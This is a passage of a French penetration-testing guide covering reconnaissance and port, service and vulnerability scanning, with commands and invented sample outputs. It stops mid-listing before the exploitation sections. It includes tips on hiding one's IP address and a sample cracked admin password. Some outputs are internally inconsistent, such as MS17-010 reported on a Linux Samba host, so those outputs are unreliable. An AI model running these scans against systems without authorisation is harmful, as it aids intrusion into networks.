# Méthodologie de Test d'Intrusion

## Table des matières

1. [Reconnaissance](#1-reconnaissance)
2. [Scan](#2-scan)
3. [Exploitation](#3-exploitation)
4. [Post-Exploitation](#4-post-exploitation)

# 1. Reconnaissance

## Objectif : Collecter des informations sur la cible

La phase de reconnaissance est la première étape cruciale d'un test d'intrusion. Elle consiste à recueillir le maximum d'informations sur la cible sans nécessairement interagir directement avec ses systèmes. Cette phase permet d'établir une cartographie précise de l'environnement cible, d'identifier les vecteurs d'attaque potentiels et de préparer les phases suivantes du pentest.

### Modes opératoires

#### Reconnaissance passive

La reconnaissance passive implique la collecte d'informations sans interagir directement avec les systèmes de la cible. Cette approche est discrète et minimise les risques de détection.

**Avantages :**
- Aucune alerte générée sur les systèmes de la cible
- Risque minimal de perturbation des services
- Possibilité de collecter des informations sensibles sans laisser de traces

**Inconvénients :**
- Informations potentiellement incomplètes ou obsolètes
- Processus généralement plus long

#### Reconnaissance active

La reconnaissance active implique une interaction directe avec les systèmes de la cible pour obtenir des informations plus précises et à jour.

**Avantages :**
- Informations plus précises et actuelles
- Identification plus complète des services et vulnérabilités

**Inconvénients :**
- Risque élevé de détection (génération de logs et alertes)
- Possibilité de perturber les services de la cible

### Commandes types et exemples de sorties

#### 1. Collecte d'informations sur le domaine

**Commande WHOIS :**
```bash
whois example.com
```

**Sortie typique :**
```
Domain Name: EXAMPLE.COM
Registry Domain ID: 2336799_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.iana.org
Registrar URL: http://www.iana.org
Updated Date: 2023-08-14T07:02:37Z
Creation Date: 1995-08-14T04:00:00Z
Registry Expiry Date: 2024-08-13T04:00:00Z
Registrar: ICANN
Registrar IANA ID: 376
Registrar Abuse Contact Email: abuse@iana.org
Registrar Abuse Contact Phone: +1.3105301642
Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited
Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited
Name Server: A.IANA-SERVERS.NET
Name Server: B.IANA-SERVERS.NET
DNSSEC: signedDelegation
DNSSEC DS Data: 31589 8 1 3490A6806D47F17A34C29E2CE80E8A999FFBE4BE
DNSSEC DS Data: 31589 8 2 CDE0D742D6998AA554A92D890F8184C698CFAC8A26FA59875A990C03E576343C
URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
```

**Analyse :** Cette commande permet d'obtenir des informations sur l'enregistrement du domaine, notamment les contacts administratifs et techniques, les serveurs DNS, la date de création et d'expiration du domaine. Ces informations peuvent être utilisées pour identifier l'organisation propriétaire, ses contacts et son infrastructure DNS.

#### 2. Recherche DNS

**Commande nslookup :**
```bash
nslookup -type=any example.com
```

**Sortie typique :**
```
Server:		8.8.8.8
Address:	8.8.8.8#53

Non-authoritative answer:
example.com	nameserver = a.iana-servers.net.
example.com	nameserver = b.iana-servers.net.
example.com	mail exchanger = 0 mail.example.com.
example.com	text = "v=spf1 include:_spf.example.com ~all"
example.com	internet address = 93.184.216.34
example.com	has AAAA address 2606:2800:220:1:248:1893:25c8:1946
```

**Commande dig :**
```bash
dig example.com ANY
```

**Sortie typique :**
```
; <<>> DiG 9.16.1-Ubuntu <<>> example.com ANY
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12345
;; flags: qr rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;example.com.			IN	ANY

;; ANSWER SECTION:
example.com.		86400	IN	A	93.184.216.34
example.com.		86400	IN	AAAA	2606:2800:220:1:248:1893:25c8:1946
example.com.		86400	IN	NS	a.iana-servers.net.
example.com.		86400	IN	NS	b.iana-servers.net.
example.com.		86400	IN	MX	0 mail.example.com.

;; Query time: 28 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Wed Apr 02 17:15:22 UTC 2025
;; MSG SIZE  rcvd: 154
```

**Analyse :** Ces commandes permettent d'obtenir des informations sur les enregistrements DNS d'un domaine, notamment les adresses IP, les serveurs de messagerie, les enregistrements TXT (souvent utilisés pour SPF, DKIM, etc.). Ces informations sont essentielles pour cartographier l'infrastructure réseau de la cible.

#### 3. Énumération des sous-domaines

**Commande avec Sublist3r :**
```bash
sublist3r -d example.com
```

**Sortie typique :**
```
                 ____        _     _ _     _   _____
                / ___| _   _| |__ | (_)___| |_|___ / _ __
                \___ \| | | | '_ \| | / __| __| |_ \| '__|
                 ___) | |_| | |_) | | \__ \ |_ ___) | |
                |____/ \__,_|_.__/|_|_|___/\__|____/|_|

                # Coded By Ahmed Aboul-Ela - @aboul3la
    
[+] Enumerating subdomains now for example.com
[+] Searching now in Baidu..
[+] Searching now in Yahoo..
[+] Searching now in Google..
[+] Searching now in Bing..
[+] Searching now in Ask..
[+] Searching now in Netcraft..
[+] Searching now in DNSdumpster..
[+] Searching now in Virustotal..
[+] Searching now in ThreatCrowd..
[+] Searching now in SSL Certificates..
[+] Searching now in PassiveDNS..
[+] Total Unique Subdomains Found: 9

www.example.com
mail.example.com
webmail.example.com
ftp.example.com
intranet.example.com
vpn.example.com
dev.example.com
api.example.com
staging.example.com
```

**Analyse :** Cette commande permet d'énumérer les sous-domaines associés au domaine principal en utilisant diverses sources publiques. L'identification des sous-domaines est cruciale car ils peuvent révéler des services ou environnements moins sécurisés (comme des environnements de développement ou de test).

#### 4. Recherche d'informations sur les employés et l'organisation

**Commande avec theHarvester :**
```bash
theHarvester -d example.com -b all
```

**Sortie typique :**
```
*******************************************************************
*  _   _                                            _             *
* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *
* | __|  _ \ / _ \  / /_/ / _` | '__\ \ / / _ \/ __| __/ _ \ '__| *
* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *
*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *
*                                                                 *
* theHarvester 4.0.3                                              *
* Coded by Christian Martorella                                   *
* Edge-Security Research                                          *
* cmartorella@edge-security.com                                   *
*                                                                 *
*******************************************************************

[*] Target: example.com

[*] Searching LinkedIn...
[+] LinkedIn users found:
    John Smith - CTO at Example Inc
    Jane Doe - Security Engineer at Example Inc
    Robert Johnson - Network Administrator at Example Inc
    Emily Williams - Web Developer at Example Inc

[*] Searching Google...
[+] Emails found:
    admin@example.com
    info@example.com
    support@example.com
    webmaster@example.com
    security@example.com

[*] Searching Twitter...
[+] Twitter users found:
    @example - Official Example Inc account
    @exampleCEO - CEO of Example Inc

[*] Searching DNS records...
[+] DNS A records found:
    example.com: 93.184.216.34
    www.example.com: 93.184.216.34
    mail.example.com: 93.184.216.35

[+] DNS MX records found:
    example.com -> mail.example.com (Priority: 10)

[*] Searching for virtual hosts...
[+] Virtual hosts found:
    admin.example.com
    portal.example.com
    webmail.example.com
```

**Analyse :** Cette commande permet de collecter des informations sur les employés, les adresses e-mail et les comptes de médias sociaux associés au domaine cible. Ces informations peuvent être utilisées pour des attaques d'ingénierie sociale ou pour identifier des comptes potentiellement vulnérables.

#### 5. Empreinte des technologies web

**Commande avec Whatweb :**
```bash
whatweb https://example.com
```

**Sortie typique :**
```
https://example.com [200 OK] Country[UNITED STATES][US], HTML5, HTTPServer[nginx/1.17.10], IP[93.184.216.34], Title[Example Domain], nginx[1.17.10]
```

**Analyse :** Cette commande permet d'identifier les technologies utilisées par un site web, notamment le serveur web, le CMS, les frameworks et autres composants. Ces informations sont précieuses pour identifier des vulnérabilités connues associées à ces technologies.

#### 6. Analyse des métadonnées des documents publics

**Commande avec exiftool :**
```bash
exiftool document.pdf
```

**Sortie typique :**
```
ExifTool Version Number         : 12.30
File Name                       : document.pdf
Directory                       : .
File Size                       : 256 KiB
File Modification Date/Time     : 2025:04:01 14:23:45+00:00
File Access Date/Time           : 2025:04:02 17:20:12+00:00
File Creation Date/Time         : 2025:04:01 14:23:45+00:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Create Date                     : 2025:03:28 09:15:30+00:00
Modify Date                     : 2025:03:28 09:15:30+00:00
Creator                         : Microsoft Word for Office 365
Producer                        : Microsoft: Print to PDF
Author                          : John Smith
Title                           : Internal Security Policy
Subject                         : Confidential
Keywords                        : security, policy, internal
Company                         : Example Inc
```

**Analyse :** Cette commande permet d'extraire les métadonnées des documents publics disponibles sur le site web de la cible. Ces métadonnées peuvent révéler des informations sensibles comme les noms d'utilisateurs, les logiciels utilisés, les dates de création/modification, et parfois même des commentaires internes.

#### 7. Recherche d'informations sur les réseaux sociaux

**Commande avec Social-Analyzer :**
```bash
social-analyzer --username "example_inc" --metadata --extract --trim --output json
```

**Sortie typique (format JSON simplifié) :**
```json
{
  "detected": [
    {
      "platform": "Twitter",
      "url": "https://twitter.com/example_inc",
      "status": "good",
      "username": "example_inc",
      "account_type": "business",
      "metadata": {
        "bio": "Official account of Example Inc. Leading provider of cybersecurity solutions.",
        "location": "San Francisco, CA",
        "created_at": "2015-06-12",
        "followers_count": 15243,
        "following_count": 342
      }
    },
    {
      "platform": "LinkedIn",
      "url": "https://linkedin.com/company/example-inc",
      "status": "good",
      "username": "example-inc",
      "account_type": "business",
      "metadata": {
        "employees_count": "51-200",
        "industry": "Information Technology & Services",
        "headquarters": "San Francisco, California"
      }
    },
    {
      "platform": "GitHub",
      "url": "https://github.com/example-inc",
      "status": "good",
      "username": "example-inc",
      "account_type": "organization",
      "metadata": {
        "repositories": 28,
        "members": 15,
        "description": "Official Example Inc. open source projects"
      }
    }
  ]
}
```

**Analyse :** Cette commande permet d'identifier et d'analyser les comptes de réseaux sociaux associés à la cible. Ces informations peuvent révéler la structure organisationnelle, les employés clés, les technologies utilisées (via GitHub par exemple) et d'autres informations utiles pour la phase d'exploitation.

#### 8. Analyse des fuites de données

**Commande avec h8mail :**
```bash
h8mail -t example.com -c haveibeenpwned
```

**Sortie typique :**
```
[+] h8mail report for example.com
[+] Target: example.com
[+] Checking breach databases...
[!] Found in "LinkedIn Data Breach - May 2016"
[!] Found in "Adobe Users - October 2013"
[+] Checking username databases...
[!] Found username "example_admin" in "GitHub Credentials Leak - 2018"
[+] Checking password databases...
[!] Found 3 password hashes for domain emails
[+] Checking for previously cracked passwords...
[!] Found plaintext password "P@ssw0rd123!" for admin@example.com
```

**Analyse :** Cette commande permet de vérifier si des adresses e-mail ou des informations d'identification associées au domaine cible ont été compromises dans des fuites de données connues. Ces informations peuvent être utilisées pour des attaques par force brute ou pour tester la réutilisation de mots de passe.

### Conseils pratiques pour la phase de reconnaissance

1. **Commencez toujours par la reconnaissance passive** avant de passer à des méthodes actives, afin de minimiser les risques de détection.

2. **Documentez systématiquement toutes les informations recueillies** dans un format structuré pour faciliter l'analyse ultérieure.

3. **Utilisez des outils automatisés** pour accélérer la collecte d'informations, mais **vérifiez manuellement les résultats** pour éviter les faux positifs.

4. **Respectez le cadre légal** défini dans la lettre d'autorisation du test d'intrusion.

5. **Adaptez votre approche en fonction du type de cible** :
   - Pour une cible avec une forte présence en ligne, concentrez-vous sur l'analyse des réseaux sociaux et des documents publics.
   - Pour une cible avec une infrastructure complexe, privilégiez l'énumération DNS et la cartographie réseau.

6. **Utilisez des proxys ou VPN** lors de la reconnaissance active pour masquer votre adresse IP réelle.

7. **Limitez la cadence des requêtes** lors de l'utilisation d'outils automatisés pour éviter d'être bloqué par des mécanismes anti-DoS.

### Adaptation selon le mode opératoire

#### Test interne vs externe

**Test externe :**
- Concentrez-vous sur les informations accessibles publiquement
- Utilisez des techniques de reconnaissance passive plus extensives
- Explorez les périmètres exposés sur Internet (sites web, VPN, services cloud)

**Test interne :**
- Utilisez des outils d'énumération réseau comme nbtscan ou ldapsearch
- Concentrez-vous sur la cartographie du réseau interne et l'identification des services
- Analysez les partages réseau accessibles sans authentification

#### Exemple de commande pour test interne :
```bash
nbtscan -r 192.168.1.0/24
```

**Sortie typique :**
```
Doing NBT name scan for addresses from 192.168.1.0/24

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
192.168.1.1     ROUTER           <server>  <unknown>        00:11:22:33:44:55
192.168.1.10    DC01             <server>  <domain ctrl>    AA:BB:CC:DD:EE:FF
192.168.1.20    FILESERVER       <server>  <unknown>        11:22:33:44:55:66
192.168.1.30    PRINTSERVER      <server>  <unknown>        22:33:44:55:66:77
192.168.1.100   WORKSTATION01    <server>  <unknown>        33:44:55:66:77:88
192.168.1.101   WORKSTATION02    <server>  <unknown>        44:55:66:77:88:99
```

**Analyse :** Cette commande permet d'identifier les machines sur le réseau local, leurs noms NetBIOS, leurs rôles (serveur, contrôleur de domaine, etc.) et leurs adresses MAC. Ces informations sont essentielles pour cartographier le réseau interne et identifier les cibles potentielles pour les phases suivantes du test d'intrusion.

### Conclusion

La phase de reconnaissance est fondamentale pour le succès d'un test d'intrusion. Elle permet d'établir une cartographie précise de la cible et d'identifier les vecteurs d'attaque potentiels. Une reconnaissance minutieuse et méthodique augmente considérablement les chances de succès des phases suivantes du pentest.

La qualité et la quantité d'informations recueillies durant cette phase détermineront en grande partie l'efficacité des phases de scan et d'exploitation. Il est donc crucial d'y consacrer suffisamment de temps et de ressources.
# 2. Scan

## Objectif : Identifier les ports et services ouverts

La phase de scan est la deuxième étape d'un test d'intrusion, suivant la phase de reconnaissance. Elle consiste à analyser activement la cible pour identifier les ports ouverts, les services en cours d'exécution, les versions de ces services, et potentiellement les vulnérabilités associées. Cette phase permet d'établir une cartographie précise de l'infrastructure technique de la cible et de préparer la phase d'exploitation.

### Modes opératoires

#### Scan discret

Le scan discret vise à minimiser la détection par les systèmes de sécurité de la cible tout en obtenant des informations utiles.

**Avantages :**
- Risque réduit de détection par les IDS/IPS
- Moins susceptible de perturber les services de la cible
- Utile pour les tests où la discrétion est primordiale

**Inconvénients :**
- Processus plus lent
- Informations potentiellement incomplètes
- Moins efficace contre les systèmes bien protégés

#### Scan agressif

Le scan agressif privilégie l'exhaustivité et la rapidité au détriment de la discrétion.

**Avantages :**
- Informations plus complètes et détaillées
- Processus plus rapide
- Identification plus précise des services et versions

**Inconvénients :**
- Facilement détectable par les systèmes de sécurité
- Risque de perturber les services ou de causer des dénis de service
- Peut déclencher des alertes de sécurité

### Commandes types et exemples de sorties

#### 1. Scan de découverte d'hôtes

**Commande Nmap pour ping sweep :**
```bash
nmap -sn 192.168.1.0/24
```

**Sortie typique :**
```
Starting Nmap 7.92 ( https://nmap.org ) at 2025-04-02 17:30 UTC
Nmap scan report for router.local (192.168.1.1)
Host is up (0.0023s latency).
MAC Address: 00:11:22:33:44:55 (Cisco Systems)
Nmap scan report for server.local (192.168.1.10)
Host is up (0.0045s latency).
MAC Address: AA:BB:CC:DD:EE:FF (Dell)
Nmap scan report for workstation1.local (192.168.1.100)
Host is up (0.0078s latency).
MAC Address: 11:22:33:44:55:66 (HP)
Nmap scan report for workstation2.local (192.168.1.101)
Host is up (0.0082s latency).
MAC Address: 22:33:44:55:66:77 (Lenovo)
Nmap done: 256 IP addresses (4 hosts up) scanned in 3.62 seconds
```

**Analyse :** Cette commande effectue un balayage de ping sur le réseau spécifié pour identifier les hôtes actifs sans scanner les ports. Elle est utile pour établir rapidement une liste des machines actives sur le réseau cible avant de procéder à des scans plus détaillés.

**Commande avec masscan pour découverte rapide :**
```bash
masscan -p22,80,443,3389 192.168.1.0/24 --rate=1000
```

**Sortie typique :**
```
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2025-04-02 17:35:00 GMT
Initiating SYN Stealth Scan
Scanning 256 hosts [4 ports/host]
Discovered open port 22/tcp on 192.168.1.10
Discovered open port 80/tcp on 192.168.1.10
Discovered open port 443/tcp on 192.168.1.10
Discovered open port 3389/tcp on 192.168.1.100
Discovered open port 3389/tcp on 192.168.1.101
Discovered open port 80/tcp on 192.168.1.1
```

**Analyse :** Masscan est un scanner de ports extrêmement rapide qui peut être utilisé pour identifier rapidement les ports ouverts sur un large éventail d'adresses IP. Cette commande scanne spécifiquement les ports 22 (SSH), 80 (HTTP), 443 (HTTPS) et 3389 (RDP) sur tout le réseau 192.168.1.0/24 à un taux de 1000 paquets par seconde.

#### 2. Scan de ports

**Commande Nmap pour scan de ports standard :**
```bash
nmap -p 1-1000 192.168.1.10
```

**Sortie typique :**
```
Starting Nmap 7.92 ( https://nmap.org ) at 2025-04-02 17:40 UTC
Nmap scan report for server.local (192.168.1.10)
Host is up (0.0045s latency).

PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
443/tcp open  https
445/tcp open  microsoft-ds
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds
```

**Commande Nmap pour scan de tous les ports :**
```bash
nmap -p- 192.168.1.10
```

**Sortie typique :**
```
Starting Nmap 7.92 ( https://nmap.org ) at 2025-04-02 17:45 UTC
Nmap scan report for server.local (192.168.1.10)
Host is up (0.0045s latency).
Not shown: 65520 closed tcp ports (reset)

PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
8080/tcp  open  http-proxy
8443/tcp  open  https-alt
10000/tcp open  snet-sensor-mgmt
27017/tcp open  mongod
33060/tcp open  mysqlx

Nmap done: 1 IP address (1 host up) scanned in 120.45 seconds
```

**Analyse :** Ces commandes permettent de scanner les ports ouverts sur une cible spécifique. La première commande scanne uniquement les 1000 premiers ports, tandis que la seconde scanne tous les ports TCP possibles (1-65535). Les résultats montrent les ports ouverts et les services associés, ce qui permet d'identifier les vecteurs d'attaque potentiels.

#### 3. Scan de détection de service et de version

**Commande Nmap pour détection de service et version :**
```bash
nmap -sV -p 21,22,25,80,443,445,3306 192.168.1.10
```

**Sortie typique :**
```
Starting Nmap 7.92 ( https://nmap.org ) at 2025-04-02 17:50 UTC
Nmap scan report for server.local (192.168.1.10)
Host is up (0.0045s latency).

PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp       Postfix smtpd
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
443/tcp  open  ssl/https  Apache httpd 2.4.41 ((Ubuntu))
445/tcp  open  netbios-ssn Samba smbd 4.6.2
3306/tcp open  mysql      MySQL 8.0.28-0ubuntu0.20.04.3

Service Info: Host: server.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 12.34 seconds
```

**Analyse :** Cette commande permet d'identifier non seulement les ports ouverts, mais aussi les versions précises des services qui y sont exécutés. Ces informations sont cruciales pour la phase d'exploitation, car elles permettent d'identifier les vulnérabilités spécifiques à ces versions.

#### 4. Scan de détection du système d'exploitation

**Commande Nmap pour détection du système d'exploitation :**
```bash
nmap -O 192.168.1.10
```

**Sortie typique :**
```
Starting Nmap 7.92 ( https://nmap.org ) at 2025-04-02 17:55 UTC
Nmap scan report for server.local (192.168.1.10)
Host is up (0.0045s latency).
Not shown: 988 closed tcp ports (reset)

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
443/tcp  open  https
445/tcp  open  microsoft-ds
3306/tcp open  mysql

OS details: Linux 5.4.0-89-generic (Ubuntu 20.04)
Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.67 seconds
```

**Analyse :** Cette commande tente de déterminer le système d'exploitation de la cible en analysant les réponses aux paquets envoyés. Cette information est importante pour cibler les exploits spécifiques à ce système d'exploitation lors de la phase d'exploitation.

#### 5. Scan complet avec scripts NSE

**Commande Nmap avec scripts par défaut :**
```bash
nmap -sC -sV -p 21,22,25,80,443,445,3306 192.168.1.10
```

**Sortie typique :**
```
Starting Nmap 7.92 ( https://nmap.org ) at 2025-04-02 18:00 UTC
Nmap scan report for server.local (192.168.1.10)
Host is up (0.0045s latency).

PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Apr 01  2025 pub
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a5:dd:48:5d:e5:fd:6e:a8:f0:28:79:de:ea:24:d1:7d (RSA)
|   256 bc:31:f5:40:1c:9e:b7:61:27:76:d9:65:7c:f4:7f:1d (ECDSA)
|_  256 b7:6d:07:4f:66:18:22:82:5d:08:9a:32:13:1d:7c:39 (ED25519)
25/tcp   open  smtp       Postfix smtpd
|_smtp-commands: server.local, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Example Company - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
443/tcp  open  ssl/https  Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Example Company - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
| ssl-cert: Subject: commonName=server.local/organizationName=Example Inc/stateOrProvinceName=California/countryName=US
| Not valid before: 2025-01-01T00:00:00
|_Not valid after:  2026-01-01T00:00:00
|_ssl-date: TLS randomness does not represent time
445/tcp  open  netbios-ssn Samba smbd 4.6.2
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.6.2)
|   Computer name: server
|   NetBIOS computer name: SERVER\x00
|   Domain name: local
|   FQDN: server.local
|_  System time: 2025-04-02T18:00:15+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-04-02T18:00:15
|_  start_date: N/A
3306/tcp open  mysql      MySQL 8.0.28-0ubuntu0.20.04.3
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.28-0ubuntu0.20.04.3
|   Thread ID: 10
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, SupportsLoadDataLocal, IgnoreSigpipes, Speaks41ProtocolOld, InteractiveClient, SupportsTransactions, LongPassword, DontAllowDatabaseTableColumn, SwitchToSSLAfterHandshake, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, ODBCClient, Speaks41ProtocolNew, FoundRows, SupportsCompression, LongColumnFlag, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x7F\x08\x15\x1A\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C
|_  Auth Plugin Name: caching_sha2_password

Service Info: Host: server.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.78 seconds
```

**Analyse :** Cette commande combine la détection de service et de version avec l'exécution des scripts NSE (Nmap Scripting Engine) par défaut. Ces scripts effectuent des tests supplémentaires sur chaque service découvert, fournissant des informations détaillées qui peuvent révéler des vulnérabilités ou des configurations incorrectes.

#### 6. Scan de vulnérabilités avec Nmap

**Commande Nmap avec scripts de vulnérabilité :**
```bash
nmap --script vuln -p 21,22,25,80,443,445,3306 192.168.1.10
```

**Sortie typique :**
```
Starting Nmap 7.92 ( https://nmap.org ) at 2025-04-02 18:05 UTC
Nmap scan report for server.local (192.168.1.10)
Host is up (0.0045s latency).

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /admin/: Admin login page
|   /backup/: Directory listing
|   /images/: Directory listing
|_  /phpmyadmin/: phpMyAdmin
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: VULNERABLE
|     Description: Slowloris tries to keep many connections to the target web server open and hold them open as long as possible. It accomplishes this by opening connections to the target web server and sending a partial request. Slowloris keeps the connections open by sending subsequent HTTP headers, but never completing the request.
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
443/tcp  open  https
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|     Description:
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://www.openssl.org/news/secadv_20140407.txt
|_      http://cvedetails.com/cve/2014-0160/
445/tcp  open  microsoft-ds
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|     Description:
|       The SMBv1 server in Microsoft Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; and Windows Server 2016 allows remote attackers to execute arbitrary code via crafted packets.
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 120.45 seconds
```

**Analyse :** Cette commande exécute spécifiquement les scripts de détection de vulnérabilités de Nmap sur les ports spécifiés. Les résultats montrent plusieurs vulnérabilités potentielles, notamment Slowloris sur le serveur web, Heartbleed sur le service HTTPS, et MS17-010 (EternalBlue) sur le service SMB. Ces informations sont directement exploitables lors de la phase d'exploitation.

#### 7. Scan de services web

**Commande Nikto pour analyse de vulnérabilités web :**
```bash
nikto -h 192.168.1.10
```

**Sortie typique :**
```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.10
+ Target Hostname:    server.local
+ Target Port:        80
+ Start Time:         2025-04-02 18:10:00 (GMT)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5c67c5d5e3f5a, mtime: gzip
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ Cookie PHPSESSID created without the httponly flag
+ /admin/login.php: Admin login page/section found.
+ /phpmyadmin/: phpMyAdmin directory found
+ /backup/: Directory indexing found.
+ /images/: Directory indexing found.
+ 7915 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2025-04-02 18:15:23 (GMT) (323 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

**Analyse :** Nikto est un scanner de vulnérabilités web qui identifie les problèmes de configuration, les fichiers dangereux, les versions obsolètes des logiciels et autres problèmes de sécurité sur les serveurs web. Les résultats montrent plusieurs problèmes, notamment l'absence d'en-têtes de sécurité, des répertoires sensibles accessibles et une page de connexion d'administration.

**Commande dirb pour énumération de répertoires web :**
```bash
dirb http://192.168.1.10 /usr/share/dirb/wordlists/common.txt
```

**Sortie typique :**
```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Apr  2 18:20:00 2025
URL_BASE: http://192.168.1.10/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.10/ ----
==> DIRECTORY: http://192.168.1.10/admin/                                                         
==> DIRECTORY: http://192.168.1.10/backup/                                                        
==> DIRECTORY: http://192.168.1.10/css/                                                           
==> DIRECTORY: http://192.168.1.10/images/                                                        
==> DIRECTORY: http://192.168.1.10/includes/                                                      
==> DIRECTORY: http://192.168.1.10/js/                                                            
+ http://192.168.1.10/index.php (CODE:200|SIZE:7258)                                              
+ http://192.168.1.10/login.php (CODE:200|SIZE:2541)                                              
+ http://192.168.1.10/logout.php (CODE:302|SIZE:0)                                                
==> DIRECTORY: http://192.168.1.10/phpmyadmin/                                                    
+ http://192.168.1.10/robots.txt (CODE:200|SIZE:120)                                              
+ http://192.168.1.10/server-status (CODE:403|SIZE:278)                                           
+ http://192.168.1.10/wp-login.php (CODE:200|SIZE:4567)                                           

---- Entering directory: http://192.168.1.10/admin/ ----
